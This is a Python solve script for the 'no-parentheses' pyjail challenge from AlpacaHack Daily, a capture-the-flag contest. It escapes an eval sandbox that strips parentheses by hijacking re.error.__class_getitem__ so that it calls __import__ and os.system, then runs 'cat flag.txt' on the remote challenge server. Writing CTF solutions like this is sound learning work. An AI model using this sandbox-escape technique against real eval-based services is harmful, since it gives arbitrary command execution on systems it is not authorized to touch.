#!/usr/bin/env python3
"""no-parentheses (＼^o^／) - AlpacaHack Daily (misc/pyjail).
jail: eval(re.sub(r"[()]","",input())). Parens are stripped, so no call nodes.
Trick: a comprehension's for-target may be an attribute/subscript, giving
parenthesis-free assignment `[d.x for d.x in [v]]`. Overwrite
re.error.__class_getitem__ (subscripting a class calls __class_getitem__) so
re.error[...] becomes a call: first __import__, then os.system.
Usage: python3 -I solve.py HOST PORT"""
import re, socket, sys
H, P = sys.argv[1], int(sys.argv[2])
payload = (
    '[re.error for re.error.__class_getitem__ in[__import__]],'
    '[osmod:=re.error["os"]],'
    '[re.error for re.error.__class_getitem__ in[osmod.system]],'
    're.error["cat flag.txt"]'
)
assert "(" not in payload and ")" not in payload
s = socket.create_connection((H, P), timeout=20); s.settimeout(8)
buf = b""
try:
    while b">" not in buf:
        buf += s.recv(4096)
    s.sendall(payload.encode() + b"\n")
    data = b""
    while True:
        try: ch = s.recv(4096)
        except socket.timeout: break
        if not ch: break
        data += ch
finally:
    s.close()
m = re.search(rb"Alpaca\{[^}]*\}", data)
print(m.group(0).decode() if m else "[no flag]\n" + data.decode(errors="replace"))
